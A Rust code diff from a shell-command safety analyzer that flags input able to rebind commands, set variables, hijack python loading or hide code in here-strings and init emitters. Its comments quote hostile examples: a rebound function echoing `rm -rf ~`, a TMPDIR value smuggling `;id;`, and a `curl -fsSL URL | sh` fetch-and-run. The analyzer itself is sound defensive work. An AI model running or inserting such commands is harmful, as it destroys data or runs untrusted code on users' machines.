+        r"|/python|\.pth\b|sitecustomize|usercustomize",
+    ))
+    .expect("program lookup text regex")
+});
+
+/// `raw` with quotes and backslashes removed, or `None` when it holds an
+/// ANSI-C string (`$'\x68ash'`) or a numeric, Unicode or control escape
+/// (fish `\x68ash`), which can spell any name. Quotes and backslashes do not
+/// change the word the shell reads (`h\ash`, `ha''sh`, `"hash"`).
+fn unescaped_shell_text(raw: &str) -> Option<String> {
+    if raw.contains("$'")
+        || raw.as_bytes().windows(2).any(|pair| {
+            pair[0] == b'\\'
+                && (matches!(pair[1], b'x' | b'X' | b'u' | b'U' | b'c') || pair[1].is_ascii_digit())
+        })
+    {
+        return None;
+    }
+    Some(
+        raw.chars()
+            .filter(|character| !matches!(character, '\'' | '"' | '\\'))
+            .collect(),
+    )
+}
+
+/// Shell text that can change what a bare command name runs (see
+/// [`REBINDING_TEXT`] and [`unescaped_shell_text`]). Conservative by design:
+/// it is only used to refuse proofs that trust a command by name.
+pub(crate) fn input_may_rebind_commands(raw: &str) -> bool {
+    unescaped_shell_text(raw).is_none_or(|text| REBINDING_TEXT.is_match(&text))
+}
+
+/// Shell text that can change which program a bare `python3` runs or what a
+/// python process loads before its own code (see [`PROGRAM_LOOKUP_TEXT`] and
+/// [`unescaped_shell_text`]). Conservative by design: it is only used to
+/// refuse the python data-sink proof, which trusts `python3` by name.
+pub(crate) fn input_may_change_python_lookup(raw: &str) -> bool {
+    unescaped_shell_text(raw).is_none_or(|text| PROGRAM_LOOKUP_TEXT.is_match(&text))
+}
+
+/// Text (quotes and backslashes removed) that can set a shell or environment
+/// variable for a later command: an assignment word (`HOME=...`, `a[1]=...`,
+/// `X+=...`), a `${NAME=...}` / `${NAME:=...}` default assignment, an
+/// exporting or variable-setting builtin (`export`, `declare`, `typeset`,
+/// `local`, `readonly`, `setenv`, `env`, `read`, `getopts`, `mapfile`,
+/// `readarray`, `unset`, `let`, zsh `vared` / `zparseopts`), `printf -v`,
+/// allexport (`set -a`, `set -o allexport`), and a name a loop or coprocess
+/// binds (`for NAME`, zsh `foreach NAME`, `select NAME`, `coproc NAME`; fish
+/// `for NAME in`), which sets that variable for the commands in its body and
+/// after it. In fish every `set` counts.
+static VARIABLE_SETTING_TEXT: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(concat!(
+        r"(?:^|[\s;&|(){}!`])[A-Za-z_][A-Za-z0-9_]*(?:\[[^\]]*\])?\+?=",
+        r"|\$\{[^}]*=",
+        r"|(?:^|[\s;&|(){}!`])(?:export|declare|typeset|local|readonly|setenv|env|read|getopts|mapfile|readarray|unset|let|vared|zparseopts)(?:$|[\s;&|()])",
+        r"|(?:^|[\s;&|(){}!`])(?:for|foreach|select|coproc)[ \t]+[A-Za-z_][A-Za-z0-9_]*(?:$|[\s;&|(){])",
+        r"|(?:^|[\s;&|(){}!`])printf[ \t]+-\S*v",
+        r"|(?:^|[\s;&|(){}!`])set[ \t]+[-+][A-Za-z]*a",
+        r"|(?i:all_?export)",
+    ))
+    .expect("variable setting text regex")
+});
+
+static FISH_SET_TEXT: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"(?:^|[\s;&|(){}!])set(?:$|[\s;&|()])").expect("fish set text regex"));
+
+/// Whether `raw` may set a shell or environment variable that a later command
+/// reads (see [`VARIABLE_SETTING_TEXT`]). Conservative by design: it is only
+/// used to refuse proofs about a command whose output depends on variables
+/// (`ssh-agent -s` builds its socket path from `TMPDIR` and `HOME`).
+pub(crate) fn input_may_set_variables(raw: &str, shell: ShellType) -> bool {
+    let folded: String = raw
+        .chars()
+        .filter(|character| !matches!(character, '\'' | '"' | '\\'))
+        .collect();
+    VARIABLE_SETTING_TEXT.is_match(&folded)
+        || (shell == ShellType::Fish && FISH_SET_TEXT.is_match(&folded))
+}
+
+/// What an input may have changed about the shell state its nested bodies
+/// run with. Proofs that trust a command by name or by its fixed output hold
+/// only while neither is possible.
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Hash)]
+pub(crate) struct ShellStateChange {
+    /// A bare command name may run another program
+    /// ([`input_may_rebind_commands`]).
+    pub(crate) rebinds_commands: bool,
+    /// A variable may be set ([`input_may_set_variables`]).
+    pub(crate) sets_variables: bool,
+}
+
+impl ShellStateChange {
+    /// What `raw` may change. Only POSIX and fish text is read; the
+    /// name-trusting proofs exist only for those shells. A trusted init
+    /// emitter's own operand (`$(fnm env --use-on-cd)`) is plain literal text
+    /// run in a subshell, so it is left out.
+    pub(crate) fn of_input(raw: &str, shell: ShellType) -> Self {
+        if !matches!(shell, ShellType::Posix | ShellType::Fish) {
+            return Self::default();
+        }
+        let text = without_trusted_init_emitter_operands(raw, shell);
+        Self {
+            rebinds_commands: input_may_rebind_commands(&text),
+            sets_variables: input_may_set_variables(&text, shell),
+        }
+    }
+
+    fn union(self, other: Self) -> Self {
+        Self {
+            rebinds_commands: self.rebinds_commands || other.rebinds_commands,
+            sets_variables: self.sets_variables || other.sets_variables,
+        }
+    }
+}
+
+thread_local! {
+    /// What the inputs enclosing the scan running on this thread (and that
+    /// scan's own input) may have changed. A nested body is scanned on its
+    /// own text, so `export -f brew; bash -c 'eval "$(brew shellenv)"'` needs
+    /// the outer definition carried in.
+    static ENCLOSING_SHELL_STATE: std::cell::Cell<ShellStateChange> =
+        const { std::cell::Cell::new(ShellStateChange { rebinds_commands: false, sets_variables: false }) };
+}
+
+/// Adds one input's [`ShellStateChange`] to the enclosing state for as long
+/// as the scope lives (the command rules hold one for each analyzed body
+/// while they recurse into its nested bodies), and restores the previous
+/// state on drop.
+pub(crate) struct ShellStateScope {
+    previous: ShellStateChange,
+}
+
+impl ShellStateScope {
+    pub(crate) fn enter(change: ShellStateChange) -> Self {
+        let previous = ENCLOSING_SHELL_STATE.with(std::cell::Cell::get);
+        ENCLOSING_SHELL_STATE.with(|state| state.set(previous.union(change)));
+        Self { previous }
+    }
+}
+
+impl Drop for ShellStateScope {
+    fn drop(&mut self) {
+        ENCLOSING_SHELL_STATE.with(|state| state.set(self.previous));
+    }
+}
+
+pub(crate) fn enclosing_shell_state() -> ShellStateChange {
+    ENCLOSING_SHELL_STATE.with(std::cell::Cell::get)
+}
+
+static INIT_EMITTER_OPERAND: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?:^|[\s;&|(){}!])(eval|source|\.)[ \t]+("\$\([^()"`$]*\)"|\$\([^()"`$]*\)|"`[^`"$]*`"|`[^`"$]*`|<\([^()]*\)|\([^()"`$]*\))"#,
+    )
+    .expect("init emitter operand regex")
+});
+
+/// `raw` with the operand of each trusted init emitter `eval` / `source` /
+/// `.` replaced by a space.
+fn without_trusted_init_emitter_operands(raw: &str, shell: ShellType) -> std::borrow::Cow<'_, str> {
+    let operands: Vec<std::ops::Range<usize>> = INIT_EMITTER_OPERAND
+        .captures_iter(raw)
+        .filter(|captures| trusted_init_emitter_operand(&captures[1], &captures[2], shell))
+        .filter_map(|captures| captures.get(2).map(|operand| operand.range()))
+        .collect();
+    if operands.is_empty() {
+        return std::borrow::Cow::Borrowed(raw);
+    }
+    let mut text = String::with_capacity(raw.len());
+    let mut copied = 0usize;
+    for operand in operands {
+        text.push_str(&raw[copied..operand.start]);
+        text.push(' ');
+        copied = operand.end;
+    }
+    text.push_str(&raw[copied..]);
+    std::borrow::Cow::Owned(text)
+}
+
+/// Whether `raw` runs a trusted shell-init emitter's output (anywhere, at any
+/// nesting level) while it or an enclosing input may rebind the emitter's name
+/// or set a variable the emitter's output is built from (see
+/// [`ShellStateChange`]): `brew() { echo 'rm -rf ~'; }; ( eval "$(brew
+/// shellenv)" )`, `export TMPDIR='/tmp/t;id;'; eval "$(ssh-agent -s)"`.
+/// Every recursive scan level checks its whole input, and the enclosing
+/// levels' state is carried in, so a definition in an enclosing level still
+/// reaches a nested eval.
+fn rebound_init_emitter_operand(raw: &str, shell: ShellType) -> bool {
+    if !matches!(shell, ShellType::Posix | ShellType::Fish)
+        || !INIT_EMITTER_OPERAND
+            .captures_iter(raw)
+            .any(|captures| trusted_init_emitter_operand(&captures[1], &captures[2], shell))
+    {
+        return false;
+    }
+    let state = enclosing_shell_state().union(ShellStateChange::of_input(raw, shell));
+    state.rebinds_commands || state.sets_variables
+}
+
+/// [`trusted_init_emitter_operand`] for a segment whose raw text is exactly the
+/// literal leader `eval` / `source` / `.` followed by that one operand: no
+/// assignment prefix, wrapper (`command eval`, `sudo`), second operand,
+/// redirection or comment. The raw text is used because the tokenizer splits
+/// an unquoted `$(ssh-agent -s)` into several words.
+fn direct_init_emitter_operand(segment: &Segment, command: &str, shell: ShellType) -> bool {
+    if segment.command.as_deref() != Some(command) {
+        return false;
+    }
+    segment
+        .raw
+        .strip_prefix(command)
+        .filter(|rest| rest.starts_with([' ', '\t']))
+        .and_then(|rest| without_output_discards(rest.trim_matches([' ', '\t'])))
+        .is_some_and(|operand| trusted_init_emitter_operand(command, operand, shell))
+}
+
+/// `text` without its trailing output-discarding redirections, which only
+/// silence what the evaluated setup code prints: `>/dev/null`, `1>/dev/null`,
+/// `2>/dev/null`, `&>/dev/null` (spaced or not), and `2>&1` once stdout
+/// already goes to `/dev/null`. Each must follow whitespace. Any other
+/// redirection (`>>`, `<`, another file descriptor or target, a bare `2>&1`)
+/// is left in place, so the operand stays untrusted; `None` when a `2>&1`
+/// would send stderr to the terminal rather than discard it.
+fn without_output_discards(text: &str) -> Option<&str> {
+    let mut rest = text;
+    // (stdout discarded, stderr discarded, stderr joined to stdout), read
+    // right to left.
+    let mut redirections = Vec::new();
+    loop {
+        let trimmed = rest.trim_end_matches([' ', '\t']);
+        if let Some(before) = trimmed.strip_suffix("2>&1") {
+            if !before.ends_with([' ', '\t']) {
+                break;
+            }
+            redirections.push("2>&1");
+            rest = before;
+            continue;
+        }
+        let Some(before_target) = trimmed.strip_suffix("/dev/null") else {
+            break;
+        };
+        let before_operator = before_target.trim_end_matches([' ', '\t']);
+        let Some((operator, before)) = ["&>", "1>", "2>", ">"]
+            .iter()
+            .find_map(|operator| Some((*operator, before_operator.strip_suffix(operator)?)))
+        else {
+            break;
+        };
+        if !before.ends_with([' ', '\t']) {
+            break;
+        }
+        redirections.push(operator);
+        rest = before;
+    }
+    let mut stdout_discarded = false;
+    for operator in redirections.iter().rev() {
+        match *operator {
+            ">" | "1>" | "&>" => stdout_discarded = true,
+            "2>&1" if !stdout_discarded => return None,
+            _ => {}
+        }
+    }
+    Some(rest.trim_end_matches([' ', '\t']))
 }
 
 fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut ExecutableSubstitutionScan) {
@@ -10206,14 +12646,16 @@ fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut Executabl
         let replacement_body_start = scan.bodies.len();
         match command.as_str() {
             "sh" | "bash" | "zsh" | "dash" | "ksh" | "csh" | "tcsh" | "ash" | "mksh" => {
-                if let Some(body_index) = shell_command_operand(&args, shell, false) {
+                let operands = shell_command_operands(&args, shell, false);
+                for body_index in &operands {
                     push_required_literal_wrapper_body(
-                        args.get(body_index..=body_index).unwrap_or_default(),
+                        args.get(*body_index..=*body_index).unwrap_or_default(),
                         shell,
                         ShellType::Posix,
                         scan,
                     );
-                } else if has_process_substitution_arg(&args) {
+                }
+                if operands.is_empty() && has_process_substitution_arg(&args) {
                     // The interpreter consumes a generated file descriptor;
                     // the producer command is visible, but the resulting
                     // script bytes are not statically recoverable.
@@ -10221,16 +12663,26 @@ fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut Executabl
                 }
             }
             "fish" => {
-                if let Some(body_index) = shell_command_operand(&args, shell, true) {
+                let operands = shell_command_operands(&args, shell, true);
+                for body_index in &operands {
                     push_required_literal_wrapper_body(
-                        args.get(body_index..=body_index).unwrap_or_default(),
+                        args.get(*body_index..=*body_index).unwrap_or_default(),
                         shell,
                         ShellType::Fish,
                         scan,
                     );
-                } else if has_process_substitution_arg(&args) {
+                }
+                if operands.is_empty() && has_process_substitution_arg(&args) {
                     record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
                 }
+            }
+            "." | "source"
+                if matches!(shell, ShellType::Posix | ShellType::Fish)
+                    && direct_init_emitter_operand(&segment, &command, shell) =>
+            {
+                // `source <(kubectl completion zsh)`: the generated script is
+                // the reviewed emitter's own setup code. The producer body is
+                // still recovered and analyzed as a command.
             }
             "." | "source" if matches!(shell, ShellType::Posix | ShellType::Fish) => {
                 if has_process_substitution_arg(&args) {
@@ -10264,6 +12716,7 @@ fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut Executabl
                         match decode_powershell_encoded_command(operand, shell) {
                             Some(input) if !input.trim().is_empty() => {
                                 scan.bodies.push(ExecutableBody {
+                                    best_effort: false,
                                     input,
                                     shell: ShellType::PowerShell,
                                     origin: None,
@@ -10299,6 +12752,12 @@ fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut Executabl
             "cmd" => {
                 scan_cmd_cli_body(&args, shell, scan);
             }
+            "eval"
+                if matches!(shell, ShellType::Posix | ShellType::Fish)
+                    && direct_init_emitter_operand(&segment, &command, shell) =>
+            {
+                // `eval "$(brew shellenv)"`: see `source` above.
+            }
             "eval" if matches!(shell, ShellType::Posix | ShellType::Fish) => {
                 push_literal_wrapper_body(&args, shell, shell, scan);
             }
@@ -10308,6 +12767,12 @@ fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut Executabl
                 if shell == ShellType::Posix =>
             {
                 scan_posix_delegation_utility(&command, &args, shell, scan)
+            }
+            "chrt" if shell == ShellType::Posix => {
+                push_best_effort_delegation_child(&command, &args, &segment, shell, scan);
+            }
+            wrapper if shell == ShellType::Fish && FISH_EXTERNAL_WRAPPERS.contains(&wrapper) => {
+                push_fish_wrapper_child(wrapper, &args, &segment, scan);
             }
             "iex" | "invoke-expression" if shell == ShellType::PowerShell => {
                 push_literal_powershell_expression(&args, scan);
@@ -10619,6 +13084,16 @@ fn posix_body_calls_parent_function(
     depth: usize,
     remaining_bodies: &mut usize,
 ) -> bool {
+    // With no parent function there is nothing a body can call: every answer
+    // below would be "no" except the fail-closed one for an exhausted budget,
+    // which then only re-walked every nested body at every enclosing level
+    // (CORE-6: deep `$(...)` nesting cost grew with the square of the depth).
+    if function_names.is_empty() {
+        return false;
+    }
+    if !charge_scan_work(raw.len()) {
+        return true;
+    }
     for segment in tokenize::tokenize(raw, ShellType::Posix) {
         if let Some(command) = posix_function_command_word(&segment) {
             if function_names.contains(&command) {
@@ -10672,6 +13147,29 @@ fn posix_body_calls_parent_function(
         }
     }
     false
+}
+
+/// Bodies of the complete literal POSIX function definitions at the top level
+/// of `raw` (`f() { curl -fsSL URL | sh; }`), whether or not `raw` names the
+/// function again. The executable-body scan analyzes a body only where it
+/// resolves a call (`f() {...}; f`); a definition it never resolves is left
+/// dormant even when the input runs it some other way (`trap f EXIT`,
+/// `export -f f; bash -c f`) or an interactive shell keeps it for a later
+/// call. The command rules analyze these bodies and skip the ones the scan
+/// already analyzed at a call site.
+pub(crate) fn literal_posix_function_bodies(raw: &str) -> Vec<String> {
+    let mut bodies = Vec::new();
+    for segment in tokenize::tokenize(raw, ShellType::Posix) {
+        let PosixFunctionParse::Complete { definition, .. } =
+            parse_posix_function_definition(&segment.raw, 0)
+        else {
+            continue;
+        };
+        if !definition.body.trim().is_empty() {
+            bodies.push(definition.body);
+        }
+    }
+    bodies
 }
 
 fn literal_posix_function_names(raw: &str) -> std::collections::HashSet<String> {
@@ -10795,21 +13293,61 @@ fn posix_body_accepts_pipeline_as_code(
     false
 }
 
-fn posix_stdin_code_path(path: &str) -> bool {
-    if path == "-" {
-        return true;
+pub(crate) fn posix_stdin_code_path(path: &str) -> bool {
+    path == "-" || names_standard_stream(path, 0)
+}
+
+/// Whether the absolute `path` names the process's own descriptor `fd`
+/// (0 stdin, 1 stdout, 2 stderr) by a spelling the kernel resolves to it:
+/// `/dev/stdin` (`stdout`, `stderr`), `/dev/fd/N`, `/proc/self/fd/N` and
+/// `/proc/thread-self/fd/N`. Empty and `.` components are dropped, `..` is
+/// resolved lexically, and the descriptor number may carry leading zeros
+/// (`/dev//stdout`, `/dev/./stdout`, `/dev/fd/01`). Reading more spellings as
+/// the stream only widens what a caller treats as code input or download
+/// output, the fail-closed direction for every caller.
+pub(crate) fn names_standard_stream(path: &str, fd: u32) -> bool {
+    match standard_stream_device(path) {
+        Some(StreamDevice::Named(named)) => named == fd,
+        Some(StreamDevice::Numbered(number)) => number == fd,
+        None => false,
     }
+}
+
+/// How a descriptor device path names its descriptor.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum StreamDevice {
+    /// `/dev/stdin`, `/dev/stdout`, `/dev/stderr` (0, 1, 2).
+    Named(u32),
+    /// `/dev/fd/N`, `/proc/self/fd/N`, `/proc/thread-self/fd/N`.
+    Numbered(u32),
+}
+
+/// The descriptor device the absolute `path` names, by the spellings
+/// [`names_standard_stream`] documents. `None` for any other path.
+pub(crate) fn standard_stream_device(path: &str) -> Option<StreamDevice> {
     if !path.starts_with('/') {
-        return false;
+        return None;
     }
-    let parts = path
-        .split('/')
-        .filter(|part| !part.is_empty() && *part != ".")
-        .collect::<Vec<_>>();
-    let zero_fd = |value: &str| !value.is_empty() && value.bytes().all(|byte| byte == b'0');
-    matches!(parts.as_slice(), ["dev", "stdin"])
-        || matches!(parts.as_slice(), ["dev", "fd", fd] if zero_fd(fd))
-        || matches!(parts.as_slice(), ["proc", "self", "fd", fd] if zero_fd(fd))
+    let mut parts: Vec<&str> = Vec::new();
+    for part in path.split('/') {
+        match part {
+            "" | "." => {}
+            ".." => {
+                parts.pop();
+            }
+            part => parts.push(part),
+        }
+    }
+    let number = |value: &str| descriptor_number(value).and_then(|digits| digits.parse().ok());
+    match parts.as_slice() {
+        ["dev", "stdin"] => Some(StreamDevice::Named(0)),
+        ["dev", "stdout"] => Some(StreamDevice::Named(1)),
+        ["dev", "stderr"] => Some(StreamDevice::Named(2)),
+        ["dev", "fd", value] | ["proc", "self" | "thread-self", "fd", value] => {
+            number(value).map(StreamDevice::Numbered)
+        }
+        _ => None,
+    }
 }
 
 enum PosixInterpreterInputMode {
@@ -10940,6 +13478,64 @@ fn posix_non_shell_interpreter_input_mode(
         });
     }
     Some(PosixInterpreterInputMode::StdinProgram)
+}
+
+/// The literal `python -c BODY` program of a POSIX or fish invocation, read
+/// with that shell's quoting. Only a leading `-c` counts: an earlier option
+/// (`-i`, `-I`, ...) or a non-literal body is not proven.
+pub(crate) fn literal_python_inline_program(args: &[String], shell: ShellType) -> Option<String> {
+    match shell {
+        ShellType::Posix => literal_posix_python_inline_program(args),
+        ShellType::Fish => {
+            let first = static_wrapper_word(args.first()?, shell)?;
+            if first == "-c" {
+                return static_wrapper_word(args.get(1)?, shell);
+            }
+            first
+                .strip_prefix("-c")
+                .filter(|body| !body.is_empty())
+                .map(str::to_string)
+        }
+        ShellType::PowerShell | ShellType::Cmd => None,
+    }
+}
+
+/// `python -m json.tool` followed only by its own formatting flags
+/// (`--sort-keys`, `--indent N`, `--compact`, `--tab`, `--no-indent`,
+/// `--no-ensure-ascii`, `--json-lines`): a fixed standard-library module that
+/// parses standard input as JSON and writes it back to standard output. The
+/// interpreter takes no other option first (`-i` runs stdin afterward, `-W` /
+/// `-X` can import code), and a file operand is refused too (an output file
+/// is a write the pipe rule does not inspect).
+pub(crate) fn literal_python_json_tool_invocation(args: &[String], shell: ShellType) -> bool {
+    if !matches!(shell, ShellType::Posix | ShellType::Fish) {
+        return false;
+    }
+    let Some(words) = args
+        .iter()
+        .map(|arg| static_wrapper_word(arg, shell))
+        .collect::<Option<Vec<_>>>()
+    else {
+        return false;
+    };
+    let options = match words.as_slice() {
+        [flag, module, rest @ ..] if flag == "-m" && module == "json.tool" => rest,
+        [attached, rest @ ..] if attached == "-mjson.tool" => rest,
+        _ => return false,
+    };
+    let digits = |value: &str| !value.is_empty() && value.bytes().all(|byte| byte.is_ascii_digit());
+    let mut index = 0usize;
+    while index < options.len() {
+        let option = options[index].as_str();
+        match option {
+            "--sort-keys" | "--compact" | "--tab" | "--no-indent" | "--no-ensure-ascii"
+            | "--json-lines" => index += 1,
+            "--indent" if options.get(index + 1).is_some_and(|value| digits(value)) => index += 2,
+            _ if option.strip_prefix("--indent=").is_some_and(digits) => index += 1,
+            _ => return false,
+        }
+    }
+    true
 }
 
 /// Return only a Python program selected by a leading literal `-c`. A later
@@ -11126,9 +13722,13 @@ fn posix_function_invocation_needs_context(
     body: &str,
     segments: &[tokenize::Segment],
 ) -> bool {
+    // Segments are in input order: find the one holding `offset` by bisection
+    // (a linear scan per call made thousands of calls quadratic).
+    let candidate = segments.partition_point(|segment| segment.byte_range.end <= offset);
     let Some(index) = segments
-        .iter()
-        .position(|segment| segment.byte_range.start <= offset && offset < segment.byte_range.end)
+        .get(candidate)
+        .filter(|segment| segment.byte_range.start <= offset)
+        .map(|_| candidate)
     else {
         return true;
     };
@@ -11516,6 +14116,9 @@ fn lexical_executable_substitutions_bounded(
     shell: ShellType,
     remaining_bodies: &mut usize,
 ) -> (Vec<ExecutableBody>, Option<ShellExecutionGap>) {
+    if !charge_scan_work(raw.len()) {
+        return (Vec::new(), Some(ShellExecutionGap::WorkBudgetExceeded));
+    }
     let bytes = raw.as_bytes();
     let mut bodies = Vec::new();
     let mut functions = std::collections::HashMap::<String, PosixFunctionBinding>::new();
@@ -11570,6 +14173,7 @@ fn lexical_executable_substitutions_bounded(
                         if let Some(binding) = functions.get(&command) {
                             let body_index = bodies.len();
                             bodies.push(ExecutableBody {
+                                best_effort: false,
                                 input: binding.definition.body.clone(),
                                 shell,
                                 origin: Some(ExecutableBodyOrigin {
@@ -11594,6 +14198,10 @@ fn lexical_executable_substitutions_bounded(
         let byte = bytes[i];
         match quote {
             ShellLexQuote::Single => {
+                if fish_single_quote_escape_byte_at(shell, bytes, i) {
+                    i += 2;
+                    continue;
+                }
                 if byte == b'\'' {
                     if shell == ShellType::PowerShell && bytes.get(i + 1) == Some(&b'\'') {
                         i += 2;
@@ -11644,6 +14252,7 @@ fn lexical_executable_substitutions_bounded(
                         if let Some(suffix) = raw.get(i + 1..) {
                             if !suffix.trim().is_empty() {
                                 bodies.push(ExecutableBody {
+                                    best_effort: false,
                                     input: suffix.to_string(),
                                     shell,
                                     origin: Some(ExecutableBodyOrigin {
@@ -11661,6 +14270,7 @@ fn lexical_executable_substitutions_bounded(
                             gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
                         }
                         bodies.push(ExecutableBody {
+                            best_effort: false,
                             input: body.to_string(),
                             shell,
                             origin: Some(ExecutableBodyOrigin {
@@ -11762,11 +14372,40 @@ fn lexical_executable_substitutions_bounded(
             continue;
         }
         if shell == ShellType::Posix && byte == b'<' && bytes.get(i + 1) == Some(&b'<') {
-            // Heredoc/here-string payloads have their own delimiter and quote
-            // grammar. Until that grammar is represented in the command IR,
-            // fail closed instead of allowing quote-looking payload data to
-            // hide a command following the terminator.
-            gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+            // Heredocs were recovered and masked before this scan, so this is
+            // a here-string or a heredoc spelling the recovery refused. A
+            // here-string's word is read below as an ordinary word (its
+            // substitutions are recovered); its value is code when a shell
+            // reads it as its script. Anything else fails closed instead of
+            // letting quote-looking payload data hide a command.
+            match posix_here_string_at(raw, i) {
+                Some(here_string) => {
+                    if here_string.reading.ambiguous {
+                        gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                    }
+                    if let Some(child_shell) = here_string.reading.shell {
+                        match here_string.value {
+                            Some(value) if value.trim().is_empty() => {}
+                            Some(value) => bodies.push(ExecutableBody {
+                                best_effort: here_string.reading.best_effort,
+                                input: value,
+                                shell: child_shell,
+                                origin: None,
+                            }),
+                            // A shell runs an expanded value nobody can see.
+                            None => {
+                                gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                            }
+                        }
+                    }
+                    i = here_string.operator_end;
+                    word_start = true;
+                    continue;
+                }
+                None => {
+                    gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                }
+            }
         }
         if shell == ShellType::Posix
             && command_start
@@ -11788,6 +14427,7 @@ fn lexical_executable_substitutions_bounded(
                             let definition = &binding.definition;
                             let body_index = bodies.len();
                             bodies.push(ExecutableBody {
+                                best_effort: false,
                                 input: definition.body.clone(),
                                 shell,
                                 origin: Some(ExecutableBodyOrigin {
@@ -11892,6 +14532,7 @@ fn lexical_executable_substitutions_bounded(
                     if let Some(suffix) = raw.get(body_start..) {
                         if !suffix.trim().is_empty() {
                             bodies.push(ExecutableBody {
+                                best_effort: false,
                                 input: suffix.to_string(),
                                 shell,
                                 origin: Some(ExecutableBodyOrigin {
@@ -12091,6 +14732,7 @@ fn lexical_executable_substitutions_bounded(
                 if let Some(suffix) = raw.get(i + 1..) {
                     if !suffix.trim().is_empty() {
                         bodies.push(ExecutableBody {
+                            best_effort: false,
                             input: suffix.to_string(),
                             shell,
                             origin: Some(ExecutableBodyOrigin {
@@ -12111,6 +14753,7 @@ fn lexical_executable_substitutions_bounded(
                     gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
                 }
                 bodies.push(ExecutableBody {
+                    best_effort: false,
                     input: body.to_string(),
                     shell,
                     origin: Some(ExecutableBodyOrigin {
@@ -12176,6 +14819,7 @@ fn lexical_executable_substitutions_bounded(
                                 let definition = &binding.definition;
                                 let body_index = bodies.len();
                                 bodies.push(ExecutableBody {
+                                    best_effort: false,
                                     input: definition.body.clone(),
                                     shell,
                                     origin: Some(ExecutableBodyOrigin {
@@ -12217,14 +14861,28 @@ fn lexical_executable_substitutions_bounded(
             .keys()
             .cloned()
             .collect::<std::collections::HashSet<_>>();
+        // Every call of one function pushes the same body text; check each
+        // distinct text once (`f() { ... }; f; f; f; ...` re-walked the body
+        // per call and spent the shared scan-work budget).
+        let mut checked = std::collections::HashSet::new();
+        let mut checked_function_bodies = std::collections::HashSet::new();
         if invoked_function_needs_context
-            || bodies.iter().any(|body| {
-                posix_body_calls_parent_function(&body.input, &function_names, 0, remaining_bodies)
-            })
+            || bodies
+                .iter()
+                .filter(|body| checked.insert(body.input.as_str()))
+                .any(|body| {
+                    posix_body_calls_parent_function(
+                        &body.input,
+                        &function_names,
+                        0,
+                        remaining_bodies,
+                    )
+                })
             || function_body_indices.iter().any(|index| {
-                bodies
-                    .get(*index)
-                    .is_some_and(|body| contains_literal_posix_dispatch_mutation(&body.input))
+                bodies.get(*index).is_some_and(|body| {
+                    checked_function_bodies.insert(body.input.as_str())
+                        && contains_literal_posix_dispatch_mutation(&body.input)
+                })
             })
         {
             gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
@@ -12531,6 +15189,7 @@ fn push_powershell_named_function_blocks(raw: &str, scan: &mut ExecutableSubstit
         });
         if let Some(body) = body {
             scan.bodies.push(ExecutableBody {
+                best_effort: false,
                 input: body.to_string(),
                 shell: ShellType::PowerShell,
                 origin: None,
@@ -12773,6 +15432,7 @@ fn capture_powershell_executable_body(
             .filter(|body| !body.trim().is_empty())
         {
             scan.bodies.push(ExecutableBody {
+                best_effort: false,
                 input: body.to_string(),
                 shell: ShellType::PowerShell,
                 origin: None,
@@ -12787,6 +15447,7 @@ fn capture_powershell_executable_body(
     if let Some(suffix) = raw.get(open + 1..) {
         if !suffix.trim().is_empty() {
             scan.bodies.push(ExecutableBody {
+                best_effort: false,
                 input: suffix.to_string(),
                 shell: ShellType::PowerShell,
                 origin: None,
@@ -13631,6 +16292,7 @@ fn push_powershell_switch_clause_bodies(raw: &str, scan: &mut ExecutableSubstitu
             };
             if let Some(body) = raw.get(index + 1..close) {
                 scan.bodies.push(ExecutableBody {
+                    best_effort: false,
                     input: body.to_string(),
                     shell: ShellType::PowerShell,
                     origin: None,
@@ -13965,6 +16627,7 @@ fn scan_powershell_fragment_at_hashtable_depth(
                 Some(PowerShellCollectionScriptblockArgument::Static { open, close }) => {
                     if let Some(body) = raw.get(open + 1..close) {
                         scan.bodies.push(ExecutableBody {
+                            best_effort: false,
                             input: body.to_string(),
                             shell: ShellType::PowerShell,
                             origin: None,
@@ -14016,12 +16679,14 @@ fn scan_powershell_fragment_at_hashtable_depth(
                             // choose the invoked command dynamically.
                             if let Some(scriptblock) = complete_brace_body(body) {
                                 scan.bodies.push(ExecutableBody {
+                                    best_effort: false,
                                     input: scriptblock.to_string(),
                                     shell: ShellType::PowerShell,
                                     origin: None,
                                 });
                             } else {
                                 scan.bodies.push(ExecutableBody {
+                                    best_effort: false,
                                     input: body.to_string(),
                                     shell: ShellType::PowerShell,
                                     origin: None,
@@ -14086,12 +16751,14 @@ fn scan_powershell_fragment_at_hashtable_depth(
                 if let Some(method_end) = powershell_scriptblock_method_end(raw, close + 1) {
                     if let Some(scriptblock) = raw.get(i + 1..close).and_then(complete_brace_body) {
                         scan.bodies.push(ExecutableBody {
+                            best_effort: false,
                             input: scriptblock.to_string(),
                             shell: ShellType::PowerShell,
                             origin: None,
                         });
                     } else if let Some(body) = raw.get(i + 1..close) {
                         scan.bodies.push(ExecutableBody {
+                            best_effort: false,
                             input: body.to_string(),
                             shell: ShellType::PowerShell,
                             origin: None,
@@ -14140,6 +16807,7 @@ fn scan_powershell_fragment_at_hashtable_depth(
                 if let Some(method_end) = powershell_scriptblock_method_end(raw, close + 1) {
                     if let Some(body) = raw.get(i + 1..close) {
                         scan.bodies.push(ExecutableBody {
+                            best_effort: false,
                             input: body.to_string(),
                             shell: ShellType::PowerShell,
                             origin: None,
@@ -15287,6 +17955,7 @@ fn powershell_executable_substitution_scan(raw: &str) -> ExecutableSubstitutionS
